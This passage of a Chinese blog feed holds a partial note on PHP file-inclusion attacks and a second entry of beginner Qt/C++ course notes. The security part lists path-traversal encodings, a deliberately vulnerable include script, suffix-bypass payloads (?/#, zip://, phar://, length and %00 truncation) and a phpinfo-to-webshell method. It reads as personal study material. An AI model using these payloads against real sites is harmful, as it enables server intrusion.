class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x11指定后缀绕过"><a href="#0x11指定后缀绕过" class="headerlink" title="0x11指定后缀绕过"></a>0x11指定后缀绕过</h2><p>后缀测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//后缀</span></span><br><span class="line"><span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用url"><a href="#利用url" class="headerlink" title="利用url"></a>利用url</h3><p>完整url格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure><p><strong>query(?)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure><p><strong>fragment(#)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure><h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p><strong>zip://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><strong>phar://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong></p><ul><li>php版本 &lt; php 5.2.8</li></ul><p><strong>原理：</strong></p><ul><li>Windows下目录最大长度为256字节，超出的部分会被丢弃</li><li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</li></ul><p><strong>利用方法：</strong></p><ul><li><p>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;。。。省略。。。.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p><strong>利用条件：</strong></p><ul><li>magic_quotes_gpc = Off</li><li>php版本 &lt; php 5.3.4</li></ul><p><strong>利用方法：</strong></p><ul><li><p>直接在文件名的最后加上%00来截断指定的后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>注：现在用到%00阶段的情况已经不多了</p><h2 id="0x12通过phpinfo去Getshell"><a href="#0x12通过phpinfo去Getshell" class="headerlink" title="0x12通过phpinfo去Getshell"></a>0x12通过phpinfo去Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p><p>phpinfo文件泄露一直被大家所忽视，但其实phpinfo可以为攻击渗透测试人员提供很多的信息。</p><p>1.system</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p><p>提供服务器所在的操作系统的信息。</p><p>2.真实ip</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" alt="image-20200928215935664"></p><p>知道真实ip的我们可以省去cdn带来的各种困扰。我们同时也可以端口旁站一顿操作。</p><p> 3.web根目录</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p><p>网站绝对路径对渗透测试相当的有用，当你找到SQL注入点时，要上传木马的时候就需要知道网站的绝对路径才可以获取webshell。假如该网站使用的是如xampp之类的快速搭建的软件，你便可以寻找该软件对应的漏洞去尝试攻击目标网站。</p><ol><li>disable_functions</li></ol><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p><p>通过disable_functions你可以了解到该网站禁用了些什么函数，然后去绕过代码执行和编写webshell时遇到的问题。</p><ol><li>临时文件路径</li><li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li></ol><p>这次通过phpinfo来getshell的关键，phpinfo可以让我们获得临时文件路径。向phpinfo页面post恶意代码，可以在_FILES[“file1”]中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。&lt;/p&gt;
&lt;h1 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h1&gt;&lt;h2 id=&quot;0x01定义&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="文件包含" scheme="https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>大二程序设计综合实践</title>
    <link href="https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/"/>
    <id>https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-07T06:32:17.000Z</published>
    <updated>2020-12-14T00:41:59.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序设计综合实践"><a href="#程序设计综合实践" class="headerlink" title="程序设计综合实践"></a>程序设计综合实践</h1><p>图形化编程</p><p>这不同语言分数还不太一样，最后用Qt了</p><p>四个星期四个实验，应该问题不大</p><p>趁下次比赛之前把这个实验弄完</p><p>先贴链接</p><p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p><p>下面尽量用代码和注释介绍基础知识，写得有点乱，可以看b站去学</p><p>主要是自己记录一下知识</p><p>我用的是5.14的 b站应该是5.5的 有些知识会有点出入</p><h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-创建qt项目"><a href="#0x01-创建qt项目" class="headerlink" title="0x01 创建qt项目"></a>0x01 创建qt项目</h2><p>安装完成后</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p><p>可以先看一下上面这个内容</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 模块"></p><h3 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1.新建项目"></a>1.新建项目</h3><p>选第一个</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p><p>一直默认，直到选类名<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p><p>之后一直默认就可以了</p><p>最终界面如图</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p><h3 id="2-pro文件"><a href="#2-pro文件" class="headerlink" title="2. .pro文件"></a>2. .pro文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//包含的模块</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//大于Qt4版本 才包含widget模块</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//应用程序名  生成的.exe程序名称</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//模板类型    应用程序模板</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//源文件</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//头文件</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><em>\</em>.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**</strong>。</p></blockquote><h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a 应用程序对象 在Qt中 有且仅有一个</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//窗口对象 MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//必须要show方法才可以展示</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>Qt系统提供的标准类名声明头文件没有.h后缀</li><li>Qt一个类对应一个头文件，类名就是头文件名</li><li>QApplication应用程序类</li><li><ol><li>管理图形用户界面应用程序的控制流和主要设置。</li><li>是Qt的整个后台管理的命脉它<strong>包含主事件循环**</strong>，在其中来自窗口系统和其它资源的<strong>*所有事件处理和调度。它也处理应用程序的初始化和结束</strong>，并且<strong>提供对话管理</strong>。</li><li>对于任何一个使用Qt的图形用户界面应用程序，都正好存在一个QApplication 对象，而不论这个应用程序在同一时间内是不是有0、1、2或更多个窗口。</li></ol></li><li><p>a.exec()</p></li></ul><p>程序进入消息循环，等待对用户输入进行响应。这里main()把控制权转交给Qt，Qt完成事件处理工作，当应用程序退出的时候exec()的值就会返回。<strong>在exec()中，Qt接受并处理用户和系统的事件并且把它们传递给适当的窗口部件。</strong></p><h3 id="4-快捷键及命名规范"><a href="#4-快捷键及命名规范" class="headerlink" title="4.快捷键及命名规范"></a>4.快捷键及命名规范</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命名规范 </span></span><br><span class="line"><span class="comment">//类名 首字母大写，单词和单词之间首字母大写</span></span><br><span class="line"><span class="comment">//函数名 首字母小写</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / 注释</span></span><br><span class="line"><span class="comment">//ctrl + r 运行</span></span><br><span class="line"><span class="comment">//ctrl + b 编译</span></span><br><span class="line"><span class="comment">//f1 帮助文档</span></span><br><span class="line"><span class="comment">//ctrl + shift + 上 上移</span></span><br><span class="line"><span class="comment">//ctrl + i 对齐</span></span><br><span class="line"><span class="comment">//f4 切换.cpp 和 .h</span></span><br></pre></td></tr></table></figure><h2 id="0x02-新建Qt程序"><a href="#0x02-新建Qt程序" class="headerlink" title="0x02 新建Qt程序"></a>0x02 新建Qt程序</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>创建按钮</p><p>把下面这段代码复制到widget.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//按钮操作</span></span><br><span class="line">  <span class="comment">//创建第一个按钮</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//show以顶层方式弹出控件</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//设置父亲</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//显示文本</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"第一个"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//此外还有第二种方法进行操作</span></span><br><span class="line">    <span class="comment">//创建第二个按钮</span></span><br><span class="line">    <span class="comment">//按照控件大小创建窗口</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"第二个"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//移动btn2按钮</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//重置按钮大小</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//窗口操作</span></span><br><span class="line">    <span class="comment">//重置窗口大小</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//设置固定窗口大小</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//设置窗口标题</span></span><br><span class="line">    setWindowTitle(<span class="string">"计算器"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p><h3 id="2-对象树"><a href="#2-对象树" class="headerlink" title="2.对象树"></a>2.对象树</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p><p>自己创建一个MyPushButton</p><p>同时继承QPushButton</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p><p>代码如下</p><p><code>mypushbutton.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造调用"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"按钮构造析构"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mypushbutton.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure><p><code>widget.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建自己按钮对象</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>图示如下</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p><h2 id="0x03-信号和槽的机制"><a href="#0x03-信号和槽的机制" class="headerlink" title="0x03 信号和槽的机制"></a>0x03 信号和槽的机制</h2><h3 id="1-信号和槽"><a href="#1-信号和槽" class="headerlink" title="1.信号和槽"></a>1.信号和槽</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qt信号和槽 "></p><p>基本的接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;给我的按钮一个关闭窗口的功能</span><br><span class="line">&#x2F;&#x2F;参数1 信号发送者 参数2 发送的信号(函数地址) 参数3 信号接收者 参数4 处理的槽函数</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure><h4 id="自定义信号和槽"><a href="#自定义信号和槽" class="headerlink" title="自定义信号和槽"></a><strong>自定义信号和槽</strong></h4><p>自定义信号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.h文件下</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//自定义信号 写在signals下</span></span><br><span class="line">    <span class="comment">//返回值是void 只需要声明 不需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>自定义槽</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类的.文件public中</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//返回值是void 需要声明 需要实现</span></span><br><span class="line">    <span class="comment">//可以有参数，可以重载</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现在类的.cpp中实现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来进行一个<strong>小的案例</strong></p><blockquote><p>一个按钮响起之后 程序输出接受成功</p></blockquote><p>我们首先得有两个类</p><ol><li>button</li><li>recv</li></ol><p>然后得有<strong>信号 槽函数 定义槽函数 </strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是连接,这里我们<strong>需要注意只有rang之后才会接受</strong></p><p>所以就需要rang起来，<strong>这里用的plz函数让它rang</strong></p><p>其中的一些成员名需要在<code>widget.h</code>中是实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> 